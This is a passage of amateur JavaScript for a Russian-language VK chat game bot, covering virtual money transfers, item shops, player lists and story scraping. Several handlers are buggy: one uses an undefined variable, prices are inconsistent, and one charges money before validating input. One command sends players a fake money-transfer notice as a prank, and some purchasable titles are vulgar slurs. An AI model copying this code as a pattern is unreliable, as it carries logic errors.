 		if(user.iv345an228 < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
 			if(user.lvl >= 0){
 				if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 20000000000) return message.send(`💰 ➾ Пример: 'снять сумма'( снимать можно до 2.000.000 )`);
 				user.iv345an228  -= Number(message.$match[1]);
 				user.balance += Number(message.$match[1]);
 			}
 			return message.send(`Вы сняли ${spaces(message.$match[1])}$`);
 		});


 vk.updates.hear(/^(?:сейположить)\s?([0-9]+)?/i, message => { 
 	let user = acc.users[user_id(message.user)]; 
 	if(user.muee  == false) return message.send(`У Вас нет элитного дома!`)
 		if(user.balance < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
 			let id = user_id(message.user);
 		let args = message.$match[1];
 		if(!Number(args) || !args || args < 0) return message.send(`Укажите сумму\nПоложитьсейф [кол-во]`);  
 		user.balance -= Number(args);
 		user.iv345an228  += Number(args);
 		return message.send(`Вы положили в домашний сейф: ${args}$`);
 	});




 vk.updates.hear(/^(?:бпить)\s?([^]+)?/i,  message => { 
 	if(user.kvest13 < 10) return message.send(`🔸 ➾ Вы не находитесь в клубе !`);
 	for(i=0;i<200000;i++){
 		if(acc.users[i]){
 			if(acc.users[i].kvest13 >= 10){ 
 				vk.api.call("messages.send", {
 					peer_id: acc.users[i].id,
 					message: `< 💈 >: [В КЛУБЕ]\n💈 ➾ ID игрока: ${user_id(message.user)}\nСел за барную стойку и начал бухать\nЧтобы присоединиться напишите " бпить " `, random_id: 0
 				}).then((res) => {}).catch((error) => {console.log('report error'); });	
 			}
 		}
 	}
 	return message.send(`💈 Вы бухаете в клубе`);
 });
 vk.updates.hear(/^(?:танцевать)\s?([^]+)?/i,  message => { 
 	let user = acc.users[user_id(message.user)];
 	if(user.kvest13 < 10) return message.send(`🔸 ➾ Вы не находитесь в клубе !`);
 	for(i=0;i<200000;i++){
 		if(acc.users[i]){
 			if(acc.users[i].kvest13 >= 10){ 
 				vk.api.call("messages.send", {
 					peer_id: acc.users[i].id,
 					message: `< 💈 >: [В КЛУБЕ]\n💈 ➾ ID игрока: ${user_id(message.user)}\nОтжигает по полной\nЧтобы присоединиться напишите " танцевать " `, random_id: 0
 				}).then((res) => {}).catch((error) => {console.log('report error'); });	
 			}
 		}
 	}
 	return message.send(`💈 Вы танцуете в клубе`);
 });




 vk.updates.hear(/^(?:онлайн)$/i, async (message, bot) => {
 	vk.api.messages.getConversationMembers({
 		peer_id: message.peerId,
 		fields: "online"
 	}).then(async function (response) {
 		let text = `⚡ >> Люди, которые сейчас в онлайне [беседа]:\n\n`;
 		await response.profiles.map(e => {
 			if(e.id < 1) return;
 			if(e.online != 0) text += `🤤 || *id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name})\n`;
 		})
 		return message.reply(text)
 	})
 });
 vk.updates.hear(/^(?:история)$/i, async (message, bot) => {
 	let filter = (text) => { 
 		text = text.replace('&quot;', '"');
 		text = text.replace('!&quot;', '"');
 		text = text.replace('?&quot;', '"');
 		text = text.replace(/(&quot;)/ig, '"');
 		return text;
 	}

 	let story = await getStory();
 	return bot(`держи:\n\n ${filter(story)}\n\n🤤 >> Понравилось? Напиши команду "История" ещё раз!`);

 	function getStory() {
 		return rq('https://www.anekdot.ru/random/story/').then(body => {
 			let res = body.match(/(?:<div class="text">([^]+)<\/div>)/i);
 			res = res[0].split('</div>');
 			return res[0].split(`<div class="text">`).join('').split('<br>').join('\n');
 		});

 	}
 });
 updates.hear(/^\/(?:кто) (.*)/i, async (context) => {
    // Проверка, если сообщение не из чата - игнор
    if (!context.isChat) {
    	return;
    }
    // Получаем массив профилей, ибо items возвращает не совсем то, что нам надо
    let { profiles } = await vk.api.messages.getConversationMembers({
    	peer_id: context.peerId
    });
    // Получаем случайный профиль из массива
    let profile = getRandomElement(profiles);
    // Отправляем результат
    await context.send(
    	getRandomElement(['Это точно', 'Я уверен, что это', 'Сотку даю, что это']) + ' -- @id' + profile.id + '(' + profile.first_name + ')'
    	);
});

 vk.updates.hear(/^(?:стишок|стих)$/i, async (message, bot) => {
 	let filter = (text) => { 
 		text = text.replace('&quot;', '"');
 		text = text.replace('!&quot;', '"');
 		text = text.replace('?&quot;', '"');
 		text = text.replace(/(&quot;)/ig, '"');
 		return text;
 	}

 	let poems = await getPoems();
 	return bot(`держи:\n\n ${filter(poems)}\n\n🤤 >> Понравилось? Напиши команду "Стих" ещё раз!`);

 	function getPoems() {
 		return rq('https://www.anekdot.ru/random/poems/').then(body => {
 			let res = body.match(/(?:<div class="text">([^]+)<\/div>)/i);
 			res = res[0].split('</div>');
 			return res[0].split(`<div class="text">`).join('').split('<br>').join('\n');
 		});

 	}
 });








 vk.updates.hear(/^(?:чс)/i, message => { 	
 	let devs, admins, moders, vips, chat; 
 	let devels = ``;
 	devs = '"⛔ У этих челов стоит мут:>>>"\n'; 
 	gl = '""\n'; 

 	admins = '"Мут"\n'
 	moders = '"\n'; 
 	vips = '\n"\n'; 
 	for (let id in acc.users) {
 		if(acc.users[id]){
 			let user = acc.users[id];

 			if (user.mute == 1) devs += `✳ ➾ @id${acc.users[id].id}(${acc.users[id].prefix})\n`; 
 		}
 	}
 	let text = `\n`;
 	if (devs.length != 100) text += devs;
 	if (gl.length != 24) text += gl;
 	if (admins.length != 24) text += admins;  
 	if (moders.length != 24) text += moders;  
 	if (vips.length != 24) text += vips; 
 	return message.send(`${text}`);
 });
 vk.updates.hear(/^(?:lists)/i, message => { 	
 	let devs, admins, moders, vips, chat; 
 	let devels = ``;
 	devs = '"⛔ У этих челов стоит мут:>>>"\n'; 
 	gl = '""\n'; 

 	admins = '"Мут"\n'
 	moders = '"\n'; 
 	vips = '\n"\n'; 
 	for (let id in acc.users) {
 		if(acc.users[id]){
 			let user = acc.users[id];

 			if (user.aldfsfdsamin >= 1) devs += `✳ ➾ @id${acc.users[id].id}(${acc.users[id].prefix})\n`; 
 		}
 	}
 	let text = `\n`;
 	if (devs.length != 100) text += devs;
 	if (gl.length != 24) text += gl;
 	if (admins.length != 24) text += admins;  
 	if (moders.length != 24) text += moders;  
 	if (vips.length != 24) text += vips; 
 	return message.send(`${text}`);
 });

 vk.updates.hear(/^(?:bag)/i, message => { 	
 	let devs, admins, moders, vips, chat; 
 	let devels = ``;
 	devs = '"⛔ У этих челов bag с балансом NULL>>>"\n'; 
 	gl = '""\n'; 

 	admins = '"NULL:"\n'
 	moders = '"\n'; 
 	vips = '\n"\n'; 
 	for (let id in acc.users) {
 		if(acc.users[id]){
 			let user = acc.users[id];

 			if (user.balance == null) devs += `✳ ➾ @id${acc.users[id].id}(${acc.users[id].prefix})\n`; 
 		}
 	}
 	let text = `\n`;
 	if (devs.length != 100) text += devs;
 	if (gl.length != 24) text += gl;
 	if (admins.length != 24) text += admins;  
 	if (moders.length != 24) text += moders;  
 	if (vips.length != 24) text += vips; 
 	return message.send(`${text}`);
 });
 vk.updates.hear(/^(?:рпоиск)/i, message => { 
 	let user = acc.users[user_id(message.user)]; 
 	if(user.mysor < 1) return message.send(`Вы не мент !`);	
 	let devs, admins, moders, vips, chat; 
 	let devels = ``;
 	devs = '"💻 Люди в розыске:"\n'; 
 	gl = '""\n'; 

 	admins = '"💻 Люди в розыске::"\n'
 	moders = '"\n'; 
 	vips = '\n"\n'; 
 	for (let id in acc.users) {
 		if(acc.users[id]){
 			let user = acc.users[id];

 			if (user.volff10 >= 1) devs += `✳ ➾ @id${acc.users[id].id}(${acc.users[id].prefix})\n`; 
 		}
 	}
 	let text = `\n`;
 	if (devs.length != 100) text += devs;
 	if (gl.length != 24) text += gl;
 	if (admins.length != 24) text += admins;  
 	if (moders.length != 24) text += moders;  
 	if (vips.length != 24) text += vips; 
 	return message.send(`${text}`);
 });
 vk.updates.hear(/^(?:чмент)/i, message => { 
 	let user = acc.users[user_id(message.user)]; 
 	if(user.mysor < 1) return message.send(`Вы не мент !`);	
 	let devs, admins, moders, vips, chat; 
 	let devels = ``;
 	devs = '"💻 Ментов:"\n'; 
 	gl = '""\n'; 

 	admins = '"NULL:"\n'
 	moders = '"\n'; 
 	vips = '\n"\n'; 
 	for (let id in acc.users) {
 		if(acc.users[id]){
 			let user = acc.users[id];

 			if (user.mysor >= 1) devs += `✳ ➾ @id${acc.users[id].id}(${acc.users[id].prefix})\n`; 
 		}
 	}
 	let text = `\n`;
 	if (devs.length != 100) text += devs;
 	if (gl.length != 24) text += gl;
 	if (admins.length != 24) text += admins;  
 	if (moders.length != 24) text += moders;  
 	if (vips.length != 24) text += vips; 
 	return message.send(`${text}`);
 });

 vk.updates.hear(/^(?:list)/i, message => { 	
 	let devs, admins, moders, vips, chat; 
 	let devels = ``;
 	devs = '"⛔ У этих челов bag с балансом NULL>>>"\n'; 
 	gl = '""\n'; 

 	admins = '"NULL:"\n'
 	moders = '"\n'; 
 	vips = '\n"\n'; 
 	for (let id in acc.users) {
 		if(acc.users[id]){
 			let user = acc.users[id];

 			if (user.balance >= 1.1) devs += `✳ ➾ @id${acc.users[id].id}(${acc.users[id].prefix})\n`; 
 		}
 	}
 	let text = `\n`;
 	if (devs.length != 100) text += devs;
 	if (gl.length != 24) text += gl;
 	if (admins.length != 24) text += admins;  
 	if (moders.length != 24) text += moders;  
 	if (vips.length != 24) text += vips; 
 	return message.send(`${text}`);
 })


 vk.updates.hear(/^(?:передать)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => { 
 	let user = acc.users[user_id(message.user)];
 	if (message.$match[1] == 1) {
 		return message.send(`Вы решили начать игру заново! 
 			⏱ Ваш профиль будет обнулён через: 00:${rand(1,6)}${rand(0,9)}`);
 	} 
 	if(user.upis65465465 < 1) return message.send(`❗ Доступно с 1 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
 	if(!message.$match[1] || !message.$match[2]) return message.send(`👉 ➾ Пример команды: передать ID СУММА\nЕсли хотите передать все свои деньги, напишите " пвсе ID "`)
 		if(user.balance == null) return message.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`);
 	if(user.ap > 3) return message.send(`⚠ Администрации запрещено передавать $ `);
 	if(user.volftube2 == true) return message.send(`😬 Администрация запретила Вам передавать валюту.`);

 	if(user.ap < 3){
 		if(user.bloks.pay == true) return message.send(`🔸 ➾ Передавать валюту можно раз в 10 минут.`)   
 			if(message.$match[2] > 10000000) return message.send(`💴 ➾ Максимальная сумма передачи 10.000.000$\n👑 ➾ У VIP/MODER/ADMIN - Лимит передачи увеличен.`)  
 		}
 	if(user.ap == 1){
 		if(user.bloks.pay == true) return message.send(`🔸 ➾ Передавать валюту можно раз в 10 минут.`)   
 			if(message.$match[2] > 70000000) return message.send(`💴 ➾ Максимальная сумма передачи 70.000.000$\n👑 ➾ У MODER/ADMIN - Лимит передачи увеличен.`)  
 		}
 	if(user.ap == 2){
 		if(user.bloks.pay == true) return message.send(`🔸 ➾ Передавать валюту можно раз в 10 минут.`)   
 			if(message.$match[2] > 999999999999999999) return message.send(`💴 ➾ Максимальная сумма передачи 10.000.000$\n👑 ➾ У ADMIN - Лимит передачи увеличен.`)  
 		}
 	if(user.ap == 3){
 		if(user.bloks.pay == true) return message.send(`🔸 ➾ Передавать валюту можно раз в 10 минут.`)   
 			if(message.$match[2] > 99999999999999999999) return message.send(`💴 ➾ Максимальная сумма передачи 20.000.000$`)  
 		}
 	if(user.ap > 3){}

 		let id = user_id(message.user)
 	let ids = message.$match[1] 
 	if(!Number(message.$match[1]) || !Number(message.$match[2])) return message.send(`👉 ➾ ID и СУММА должны быть числового вида.`)
 		if(!acc.users[message.$match[1]] || message.$match[2] < 0) return message.send(`👉 ➾ Некорректно введены данные`)
 			if(message.$match[2] > user.balance) return message.send(`👉 ➾ У вас нет столько $`);
 		user.balance -= Number(message.$match[2]);
 		acc.users[message.$match[1]].balance += Number(message.$match[2]);
 		logs(user_id(message.user), ids, message.$match[2], type = 1)

 		user.bloks.pay = true; 
 		setTimeout(() => {
 			user.bloks.pay = false;
 		}, 360000);

 		vk.api.call("messages.send", {
 			peer_id: acc.users[message.$match[1]].id,
 			message: `💴 ➾ Игрок [ID: ${id}] ${user.prefix} перевел вам ${message.$match[2]}$ | В ${time()}`, random_id: 0
 		}).then((res) => {}).catch((error) => {console.log('pay(peredacha) error'); });	
 		return message.send(`💴 ➾ Вы успешно перевели ${acc.users[message.$match[1]].prefix} -> ${message.$match[2]}$.`);
 	});
//====

	//===

	vk.updates.hear(/^(?:бпередать)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => {  
		let user = acc.users[user_id(message.user)];
		if(user.bitcoin == null) return message.send(`🚨 Произошла ошибка ! Пожалуйста, напишите в репорт !`)   
			if(user.volftube2 == true) return message.send(`😬 Администрация запретила Вам передавать валюту.`);
		let id = user_id(message.user)
		let ids = message.$match[1]
		if(!message.$match[1] || !message.$match[2]) return message.send(`👉 ➾ Пример команды: бпередать ID СУММА`)
			if(!Number(message.$match[1]) || !Number(message.$match[2])) return message.send(`👉 ➾ ID и СУММА должны быть числового вида.`)
				if(!acc.users[message.$match[1]] || message.$match[2] < 0) return message.send(`👉 ➾ Некорректно введены данные`)
					if(message.$match[2] > user.bitcoin) return message.send(`👉 ➾ У вас нет столько Биткоинов`);
				user.bitcoin -= Number(message.$match[2]);
				acc.users[message.$match[1]].bitcoin += Number(message.$match[2]);
				logs(user_id(message.user), ids, message.$match[2], type = 1)

				vk.api.call("messages.send", {
					peer_id: acc.users[message.$match[1]].id,
					message: `💴 ➾ Игрок [ID: ${id}] ${user.prefix} перевел вам ${message.$match[2]} bitcoins | В ${time()}`, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('pay(peredacha) error'); });	
				return message.send(`💴 ➾ Вы успешно перевели ${acc.users[message.$match[1]].prefix} -> ${message.$match[2]} bitcoins.`);
			});
	vk.updates.hear(/^(?:пбабло)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => {  
		let user = acc.users[user_id(message.user)];
		if(user.bitcoin == null) return message.send(`🚨 Произошла ошибка ! Пожалуйста, напишите в репорт !`)   
			if(user.balance < 50000) return message.send(`У вас нет 50.000 $ !`);
		user.balance -= 50000;
		let id = user_id(message.user)
		let ids = message.$match[1]
		if(!message.$match[1] || !message.$match[2]) return message.send(`👉 ➾ Пример команды: пбабло ID СУММА`)
			if(!Number(message.$match[1]) || !Number(message.$match[2])) return message.send(`👉 ➾ ID и СУММА должны быть числового вида.`)
				if(!acc.users[message.$match[1]] || message.$match[2] < 0) return message.send(`👉 ➾ Некорректно введены данные`)
					logs(user_id(message.user), ids, message.$match[2], type = 1)

				vk.api.call("messages.send", {
					peer_id: acc.users[message.$match[1]].id,
					message: `💴 ➾ Игрок [ID: ${id}] ${user.prefix} перевел вам ${message.$match[2]}$ | В ${time()}`, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('pay(peredacha) error'); });	
				return message.send(`💴 ➾ Вы успешно перевели ${acc.users[message.$match[1]].prefix} -> ${message.$match[2]} $ \n- 50.000 $ за пранк !`);
			});	
	vk.updates.hear(/^(?:перевести)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => {  
		let user = acc.users[user_id(message.user)];
		let id = user_id(message.user)
		let ids = message.$match[1]
		if(!message.$match[1] || !message.$match[2]) return message.send(`👉 ➾ Пример команды: перевести ID СУММА`)
			if(user.ap > 3) return message.send(`⚠ Администрации запрещено передавать $ `);
		if(!Number(message.$match[1]) || !Number(message.$match[2])) return message.send(`👉 ➾ ID и СУММА должны быть числового вида.`)
			if(!acc.users[message.$match[1]] || message.$match[2] < 0) return message.send(`👉 ➾ Некорректно введены данные`)
				if(user.volftube2 == true) return message.send(`😬 Администрация запретила Вам передавать валюту.`);
			if(message.$match[2] > user.bank) return message.send(`👉 ➾ У вас нет в банке денежных средств ! `);
			user.bank -= Number(message.$match[2]);
			acc.users[message.$match[1]].bank += Number(message.$match[2]);
			logs(user_id(message.user), ids, message.$match[2], type = 1)

			vk.api.call("messages.send", {
				peer_id: acc.users[message.$match[1]].id,
				message: `💴 ➾ Игрок [ID: ${id}] ${user.prefix} перевел вам ${message.$match[2]} в банк | В ${time()}`, random_id: 0
			}).then((res) => {}).catch((error) => {console.log('pay(peredacha) error'); });	
			return message.send(`💴 ➾ Вы успешно перевели ${acc.users[message.$match[1]].prefix} -> ${message.$match[2]} в банк`);
		});	
//////////////////////////////////////////СИСТЕМА БОНУСА 1.1		 

////// Система машин
vk.updates.hear(/^(?:машины)\s?([1-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
 	let houses = ['Коробка', 'Подвал' , 'Палатка'] // car 
 	for(z in houses){
 		if(user.house == houses[z]){return message.send(`👉 ➾ Ваш дом слишком дешевый, чтобы иметь данный транспорт.`)}
 	}
 if(user.ffffsasa == false) return message.send(`❗ У Вас нет паспорта ! Получите в мерии BigWars !\nНапишите " Мэрия "`);
 if(user.upis65465465 < 1) return message.send(`❗ Доступно с 1 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
 if(user.house == false) return message.send(`👉 ➾ Для покупки машины Вам нужен дом!`);  
 if(!message.$match[1]){
 	return message.send(`
 		➕ 1&#8419;. Mercedes S-Class - 35.000.000$
 		➕ 2&#8419;. Volkswagen Phaeton - 45.000.000$
 		➕ 3&#8419;. Lexus LS 430 - 60.000.000$
 		➕ 4&#8419;. Skoda Rapid - 75.000.000$
 		➕ 5&#8419;. Audi A8 -  95.000.000$
 		➕ 6&#8419;. Range Rover - 119.000.000$
 		➕ 7&#8419;. BMW X6 - 70.000.000$
 		➕ 8&#8419;. Porsche Cayenne - 155.000.000$ 
 		➕ 9&#8419;. BMW 7 Series - 164.000.000$

 		🚘 ➾ Для покупки напишите: Машины [номер] 
 		⚠ ➾ 'В путь' отправить машину в рейс.
 		👉 ➾ Машина продать - для продажи.
 		👉 ➾ При продаже вернется 75% от суммы.
 		`)
 }
 let i = message.$match[1]; 
 let ids = [0,1,2,3,4,5,6,7,8,9,10]
 let count = [0, 35000000,45000000, 60000000,75000000,95000000,119000000,70000000,155000000,164000000,190000000];
 let names = [0, 'Mercedes S-Class','Volkswagen Phaeton','Lexus LS 430','Skoda Rapid','Audi A8','Range Rover','BMW X6','Porsche Cayenne','BMW 7 Series','Lexus LX']
 if(i < 0 || i > 10) return;
 if(user.cars != false) return message.send(`🛥 ➾ У вас уже куплена машина`);
 if(i > 0 && i <= 10){
 	if(user.balance < count[i]) return message.send(`🛥 ➾ У вас не достаточно денег.`);
 	user.balance -= count[i]; 
 	user.cars = ids[i]; 
 	user.alm565in = 100;
 	return message.send(`🚘 ➾ Вы купили машину (${names[i]}) за ${count[i]}$\nНапишите " тсинфо " чтобы посмотреть информацию о бензине и тд`)
 } 
}); 
 ////// Система елок
 vk.updates.hear(/^(?:елки)\s?([1-9]+)?/i, (message) => {  
 	let user = acc.users[user_id(message.user)];
	let houses = ['Коробка'] // car 
	for(z in houses){
		if(user.house == houses[z]){return message.send(`👓 У вас дом не очень ! Купите сначала домик нормальный а потом уже и елочку !`)}
	}
if(user.house == false) return message.send(`♻  ➾ Для покупки елки Вам нужен дом!`);  
if(!message.$match[1]){
	return message.send(`
		🎄🎁 1.Ель обыкновенная - 50.000 $
		🎄🎁 2.Ель канадская - 900.000 $
		🎄🎁 3.Ель французская - 1.000.000 $
		🎄🎁 4.Ель русская - 5.000.000 $


		🎄 ➾ Для покупки напишите: Елки [номер] 
		`)
}
let i = message.$match[1]; 
let ids = [0,1,2,3,4]
let count = [0,50000,900000,1000000,5000000];
let names = [0,'обыкновенная','канадская','французская ','русская']
if(i < 0 || i > 4) return;
if(user.rrr != false) return message.send(` У вас уже куплена елка`);
if(i > 0 && i <= 9999999999){
	if(user.balance < count[i]) return message.send(`🛥 ➾ У вас не достаточно денег.`);
	user.balance -= count[i]; 
	user.rrr = names[i]; 
	return message.send(`🎄 Вы купили елочку  (${names[i]}) за ${count[i]}$ , с НОВЫМ ГОДОМ !`)
} 
}); 
 /////////////////////////СИСТЕМА ТЕЛЕФОНОВ

 //////////////// СИСТЕМА ПК
  ////// Система елок
  vk.updates.hear(/^(?:Компьютеры)\s?([1-9]+)?/i, (message) => {  
  	let user = acc.users[user_id(message.user)];
	let houses = ['Коробка'] // car 
	for(z in houses){
		if(user.house == houses[z]){return message.send(` У вас дом не очень ! Купите сначала домик нормальный а потом уже и комп!`)}
	}
if(user.house == false) return message.send(`💻 ➾ Для покупки компа Вам нужен дом!`);  
if(!message.$match[1]){
	return message.send(`
		💻 1.  Компьютер " XAPER X 1 " - 10000 $
		💻 2. Компьютер " XAPER X 2 " - 30000 $
		💻 3. Компьютер " VAAX 5 " - 150000 $
		💻 4. Компьютер " MASX 56 " - 400000 $
		💻 5. Компьютер " XAPER X 9 " - 700000 $



		💻 ➾ Для покупки напишите: Компьютеры [номер] 
		`)
}
let i = message.$match[1]; 
let ids = [0,1,2,3,4]
let count = [0,10000,30000,150000,400000,700000];
let names = [0,'XAPER X 1','XAPER X 2','VAAX 5','MASX 56','XAPER X 9 ']
if(i < 0 || i > 5) return;
if(user.cvb != false) return message.send(`💻 У вас уже куплен пк !`);
if(i > 0 && i <= 9999999999){
	if(user.balance < count[i]) return message.send(`💻 ➾ У вас не достаточно денег.`);
	user.balance -= count[i]; 
	user.cvb  = names[i]; 
	return message.send(`💻 Вы купили пк  (${names[i]}) за ${count[i]}$ !`)
} 
}); 
  vk.updates.hear(/^(?:префиксы)\s?([1-9]+)?/i, (message) => {  
  	let user = acc.users[user_id(message.user)];
  	if(user.upis65465465 < 5) return message.send(`❗ Доступно с 5 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	let houses = ['Коробка'] // car 
	for(z in houses){
		if(user.house == houses[z]){return message.send(`🔆 У тя дом " коробка " и ты хочешь купить префикс ?! `)}
	}
if(user.house == false) return message.send(`🔆 ➾ Для покупки префикса Вам нужен дом!`);  
if(!message.$match[1]){
	return message.send(`

		1💂‍♀ Префикс " Бомж " - 50.000.000 $ 
		2🤡 Префикс " Клоун трахатель " - 600.000.000 $ 
		3🤴 Префикс " Король трахатель " - 1.200.000.000 $ 
		4🥊 Префикс " Боец " - 3.000.000.000 $ 
		5🐓 Префикс " Король питухов " - 40.000.000.000 $ 
		6🐀 Префикс " Местная крыса " 25.000.000.000 $ 
		7👓 Префикс " Нагибатор админов " - 50.000.000.000 $ 
		8👾 Префикс " Создатель бота " - 150.000.000.000 $
		9🌚 Префикс " Долбаеб " - 500.000.000.000 $


		🔆 ➾ Для покупки напишите: префиксы [номер] 
		`)
}
let i = message.$match[1]; 
let ids = [0,1,2,3,4,5,6,7,8,9]
let count = [0,50000000,600000000,1200000000,3000000000,40000000000,25000000000,50000000000,150000000000,500000000000];
let names = [0,'Бомж','Клоун трахатель','Король трахатель','Боец','Король питухов','Месная крыса','Нагибатор админов','Создатель бота','Долбаеб']
if(i < 0 || i > 9) return;
if(i > 0 && i <= 9999999999){
	if(user.balance < count[i]) return message.send(`🔆 ➾ У вас не достаточно денег.`);
	user.balance -= count[i]; 
	user.banan5  = names[i]; 
	return message.send(`🔆 Вы купили префикс (${names[i]}) за ${count[i]}$ !`)
} 
}); 

 //////теха
 vk.updates.hear(/^(?:Телефоны)\s?([1-9]+)?/i, (message) => {  
 	let user = acc.users[user_id(message.user)];
 	if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	let houses = ['Коробка'] // car 
	for(z in houses){
		if(user.house == houses[z]){return message.send(``)}
	} 
if(!message.$match[1]){
	return message.send(`
		1.📱 Смартфон Apple iPhone XS Max 64Gb Silver (Серебристый) - 26.000 $
		2.📱 Смартфон Apple iPhone XR 64Gb Black (Черный) - 70.000 $
		3.📱 Смартфон Samsung Galaxy J5 (2017) 16GB Black - 120.000 $
		4.📱 Смартфон Samsung G965 Galaxy S9 Plus 256Gb - 150.000 $
		5.📱 Смартфон Honor 8X Premium 128 Gb Black - 180.000 $




		📱 ➾ Для покупки напишите: Телефоны [номер] 
		`)
}
let i = message.$match[1]; 
let ids = [0,1,2,3,4]
let count = [0,26000,70000,120000,150000,180000];
let names = [0,'Apple iPhone XS Max 64Gb Silver (Серебристый)','Смартфон Apple iPhone XR 64Gb Black (Черный)','Смартфон Samsung Galaxy J5 (2017) 16GB Black','Смартфон Samsung G965 Galaxy S9 Plus 256Gb','Смартфон Honor 8X Premium 128 Gb Black']
if(i < 0 || i > 5) return;
if(user.volftube8 != false) return message.send(`📱 У вас уже куплен телефон !`);
if(i > 0 && i <= 9999999999){
	if(user.balance < count[i]) return message.send(`💻 ➾ У вас не достаточно денег.`);
	user.balance -= count[i]; 
	user.volftube8 = names[i]; 
	return message.send(`📱 Вы купили телефон  (${names[i]}) за ${count[i]}$ !\nЧтобы зайти в меню, напишите "Мтелефон"`)
} 
}); 
 /////
 
 vk.updates.hear(/^(?:машина продать)/i, (message) => {
 	let count = [0, 1000000,5000000, 10000000,15000000,25000000,39000000,49000000,55000000,64000000,70000000];
 	let user = acc.users[user_id(message.user)];
 	if(user.cars == false) return message.send(`🚘 ➾ У вас нет машины`)
 		let sum = count[user.cars] / 100 * 75;
 	user.balance += sum; 
 	user.cars = false; 
 	return message.send(`🚘 ➾ Вы продали свой автомобиль за ${sum}$`)
 });

 vk.updates.hear(/^(?:в путь)\s?([0-9]+)?/i, (message) => {   
 	let user = acc.users[user_id(message.user)];
 	if(user.upis65465465 < 4) return message.send(`❗ Доступно с 4 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
 	if(user.alm565in  < 10) return message.send(`🚘 ➾ Не достаточно бензина ! " АЗС "`)
 		if(user.cars == false) return message.send(`🚘 ➾ У вас нет машины`)
 			if(!message.$match[1]){
 				return message.send(`
 					🚘 ➾  Места для отправки машины в рейс:

 					1&#8419;. За город | 1ч 
 					2&#8419;. В Москву | 2ч
 					3&#8419;. За границу | 3ч 
 					4&#8419;. На Северный полюс | 4ч 

 					🚘 ➾ Вернувшись из рейса вы получите трофеи.
 					🚘 ➾ Чем ценнее машина, тем лучше трофеи.
 					⚠ ➾ Также, случайно может сломаться машина и она пропадет.
 					🚘 ➾ Вы также можете поработать таксистом ! Напишите " таксовать ".
 					`)
 			}
 			let i = message.$match[1]; 
 			let name = [0, 'за город','в Москву','за границу','на северный полюс']
 			let ids = [0,1,2,3,4]
 			let time = [0,3600000,7200000,10800000,14400000]
 			let times = [0,1,2,3,4]
 			if(i < 0 || i > 4) return;
 			if(user.reys != false) return message.send(`🚘 ➾ У вас уже отправлена машина в рейс`);
 			if(i > 0 && i <= 4){   
 				user.reys = true;
 				message.send(`🚘 ➾ Вы отправили машину в рейс (${name[i]}) на ${times[i]} часов.`)
 				if(rand(1,100) < 80){

 					setTimeout(() => {
 						let a = 0;
 						if(i==1){a = rand(1500,5000)}
 							if(i==2){a = rand(5000,9000)}
 								if(i==3){a = rand(10000,15000)}
 									if(i==4){a = rand(20000,30000)}
 										let id_car = user.car;
 									if(id_car < 3){a += rand(1000,3000)}
 										if(id_car > 3 && id_car < 6){a += rand(5000,8000)}
 											if(id_car > 6){a += rand(90000,12000)}
 												user.reys = false;
 											user.alm565in  -= 10;
 											return message.send(`🚘 ➾ Ваша машина успешно вернулась с рейса. Вы получили: ${a}$`)
 										}, time[message.$match[1]]);

 				}else{
 					setTimeout(() => {
 						user.reys = false;
 						user.cars = false;
 						return message.send(`🚘 ➾ К несчастью ваша машина попала в аварию. Груз не был доставлен, машину унилизировали.`)
 					}, time);
 				} 

 			} 
 		}); 

 
/////// Система вертолетов/самолетов

vk.updates.hear(/^(?:вертолеты)\s?([1-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)]; 
	let houses = ['Коробка', 'Подвал' , 'Палатка','Домик на дереве','Полуразрушенный Дом'] // car 
	for(z in houses){
		if(user.house == houses[z]){return message.send(`👉 ➾ Ваш дом слишком дешевый, чтобы иметь данный транспорт.`)}
	}
if(user.upis65465465 < 1) return message.send(`❗ Доступно с 1 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
if(user.ffffsasa == false) return message.send(`❗ У Вас нет паспорта ! Получите в мерии BigWars !\nНапишите " Мэрия "`);
 	if(user.house == false) return message.send(`👉 ➾ Для покупки вертолета Вам нужен дом!`); /// ДОМ НЕ НИЖЕ 5
 	if(!message.$match[1]){
 		return message.send(`
 			➕ 1&#8419;. Agusta A129 Mangusta - 15.000.000$
 			➕ 2&#8419;. Ми-24 - 25.000.000$
 			➕ 3&#8419;. AH-2 - 35.000.000$
 			➕ 4&#8419;. CAIC WZ-10 - 39.000.000$
 			➕ 5&#8419;. HAL LCH -  43.000.000$
 			➕ 6&#8419;. Eurocopter Tiger - 50.000.000$
 			➕ 7&#8419;. Ка-52 - 65.000.000$
 			➕ 8&#8419;. Apache - 80.000.000$  

 			🚁 ➾ Для покупки напишите: Вертолеты [номер] 
 			👉 ➾ Вертолет продать - для продажи.
 			👉 ➾ При продаже вернется 75% от суммы.
 			`)
 	}
 	let i = message.$match[1]; 
 	let ids = [0,1,2,3,4,5,6,7,8,9,10]
 	let count = [0, 150000000,25000000,35000000,39000000,43000000,50000000,6500000,80000000];
 	let names = [0, 'Agusta A129 Mangusta','Ми-24','AH-2','CAIC WZ-10','HAL LCH','Eurocopter Tiger','Ка-52','Apache']
 	if(i < 0 || i > 8) return;
 	if(user.helicopter != false) return message.send(`🚁 ➾ У вас уже куплен вертолет`);
 	if(i > 0 && i <= 8){
 		if(user.balance < count[i]) return message.send(`🚁 ➾ У вас не достаточно денег.`);
 		user.balance -= count[i];
 		user.helicopter = ids[i];
 		return message.send(`🚁 ➾ Вы купили машину (${names[i]}) за ${count[i]}$`)
 	} 
